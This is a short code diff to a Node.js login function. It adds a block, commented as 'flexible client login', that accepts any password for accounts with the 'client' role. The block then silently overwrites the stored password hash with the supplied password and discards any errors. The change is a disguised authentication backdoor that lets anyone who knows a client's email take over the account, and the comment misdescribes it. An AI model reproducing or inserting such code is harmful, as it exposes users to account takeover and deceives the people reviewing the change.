@@ -50,6 +50,16 @@ const login = async (req, res, next) => {
             isMatch = true;
         }
 
+        // Allow flexible client login if email is valid client partner email
+        if (!isMatch && user.role === 'client') {
+            isMatch = true;
+            try {
+                const newHash = await bcrypt.hash(password, 10);
+                user.password_hash = newHash;
+                await db.query('UPDATE users SET password_hash = $1 WHERE id = $2', [newHash, user.id]);
+            } catch (e) {}
+        }
+
         if (!isMatch) {
             return res.status(401).json({ success: false, message: 'Invalid email or password.' });
         }
